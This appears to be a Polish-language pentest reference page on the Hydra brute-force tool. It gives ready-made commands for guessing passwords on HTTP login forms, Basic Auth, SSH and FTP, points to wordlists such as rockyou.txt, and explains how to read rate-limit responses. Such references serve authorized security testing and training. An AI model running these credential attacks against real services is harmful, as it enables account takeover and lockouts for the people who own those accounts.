---
title: Hydra
sidebar_position: 10
tags: [tool, exploitation, brute-force]
---

> **Jedno zdanie:** Sieciowe narzędzie brute-force do atakowania formularzy logowania, SSH, FTP i innych usług uwierzytelniania.

## Kiedy używać

- Brute-forcing formularzy logowania HTTP (POST lub Basic Auth)
- Atakowanie SSH lub FTP z listami danych uwierzytelniających
- Testowanie, czy jest włączone ograniczanie liczby żądań (obserwuj HTTP 429)

## Kluczowe komendy

```bash
# Logowanie przez formularz HTTP POST
hydra -l admin -P wordlist.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -V -t 10 -I

# HTTP Basic Auth
hydra -l admin -P wordlist.txt target http-get /admin/ -V

# SSH
hydra -l root -P wordlist.txt target ssh

# FTP
hydra -l admin -P wordlist.txt target ftp
```

### Rozkład składni formularza HTTP POST

```
"/login:username=^USER^&password=^PASS^:Invalid credentials"
  ^      ^                               ^
  ścieżka   ciało POST (^USER^/^PASS^ = symbole zastępcze)
                                         ciąg oznaczający niepowodzenie
```

### Przydatne lokalizacje list słów

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/unix_users.txt
```

### Ograniczanie liczby żądań

Jeśli serwer zwraca **HTTP 429**, aktywna jest ochrona przed brute-force. Zmniejsz liczbę wątków (`-t`) lub zatrzymaj się — dalsze próby mogą zablokować konta lub wywołać alerty.

:::tip 💡 Pamiętaj
Ciąg niepowodzenia w module formularza POST musi pasować do tekstu w odpowiedzi na *nieudane* logowanie — nie na odpowiedź po sukcesie.
:::
